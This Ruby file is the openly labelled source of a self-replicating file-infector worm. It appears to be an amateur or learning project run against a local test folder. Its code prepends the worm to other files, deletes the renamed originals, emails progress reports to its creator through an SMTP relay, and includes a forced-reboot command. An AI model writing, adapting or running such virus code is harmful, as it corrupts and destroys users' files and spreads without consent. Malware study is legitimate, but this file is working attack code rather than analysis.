#0x11
$devil_axe = "
______6_____________6______
_____66_____________66_____
___6666_____________6666___
__66666_____________66666__
_666666_____666_____666666_
6666666_____666_____6666666
666666666666666666666666666
666666666666666666666666666
666666666666666666666666666
6666666_____666_____6666666
_666666_____666_____666666_
__66666_____666_____66666__
___6666_____666_____6666___
_____66_____666_____66_____
______6_____666_____6______
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________
____________666____________

"
require "net/smtp"
require "fileutils"

class Worm
    def initialize
        @tmark , @bmark = "#0x11", "#!"
        @local_dir = Dir["./**/*.rb"]
        @local_dir = Dir["C:/Users/Toshiba/Desktop/Malware/*"]
        @target_dir = Dir["C:/Windows/FakeSystem/*"]
        @apikey = "apikey"
        @secret = "secret" 
    end

    def infect
        # duplicate yourself to spread by not getting noticed
        count = 0
        id = 0
        @local_dir.each do |file|
            puts "*********************"
            puts @local_dir
            puts "Doing something on: " + file
            puts "*********************"
            first_line = File.open(file,&:gets).strip
            doppel_filename = "doppel#{id}.rb"

            if first_line != @tmark
                File.rename(file, doppel_filename)
                virus_file = File.open(__FILE__,"rb")
                virus_contents = ""
                virus_file.each_line do |line|
                virus_contents += line
                if line =~ /#{@bmark}/
                    count += 1
                    if count == 2 then
                        break
                    end
                end
            end

            File.open(file, "w") {|f| f.write(virus_contents)}
            good_file = File.open(doppel_filename,"rb")
            good_contents = good_file.read
            File.open(file, "a") {|f| f.write(good_contents)}
            #smash(doppel_filename)
            id += 1
            end
        end
        hide
    end

    def hide 
        @local_dir = Dir["C:/Users/Toshiba/Desktop/Malware/*doppel?.rb"]
        # @id -= 1
        # last_doppel_filename = "doppel#{@id}.rb"
        # empty_filename = "microsoft.txt"
        puts "------------------"
        puts @local_dir
        puts "------------------"
        recursive_delete(@local_dir)
    end

    def recursive_delete(dir)
        dir.each do |dop|            
            begin
            File.delete(dop)
            rescue
            puts "Exception occured"
            recursive_delete(dir) # this bypasses EACCES error for deleting the last doppelganger
            end
            #FileUtils::chmod(0644, doppel)
            #FileUtils.rm(doppel)
            #
            #if last_doppel_filename != doppel.split("/")[5]
                # File.delete(doppel)
            #else
                # File.rename(doppel, empty_filename)
            #end
        end
    end

    def smash(filename)
        puts "SMASH"
        @local_dir = Dir["C:/Users/Toshiba/Desktop/Malware/*doppel?.rb"]
        @local_dir.each do |doppel|
            puts "------------------"
            puts @local_dir
            puts "------------------"
            #File.delete(doppel)
        end
        #File.delete(filename) if File.file?(filename)
    end

    def notify
        # inform via email how infection is going
        message = <<MESSAGE_END
        From: Jackson <xxxx@gmail.com>
        To: Creator <yyyy@gmail.com>
        MIME-Version: 1.0
        Content-type: text/html
        Subject: SMTP e-mail test

        <h1>Good news, we have infected another file!</h1>
        <br />
        <b> Sincerely your worm friend, Jackson </b>
MESSAGE_END
    
        begin
            Net::SMTP.start('smtp.sendgrid.net', 
            587,  
            "sendgrid.com",
            @apikey,
            @secret,
              :plain) do |smtp|
                smtp.send_message message, 'xxxx@gmail.com', 'yyyy@gmail.com'
            end
        rescue Exception => e
            puts e
        end
    end

    def special
        system("shutdown.exe -r -f -t 0") 
    end

    
end

jackson = Worm.new

jackson.infect
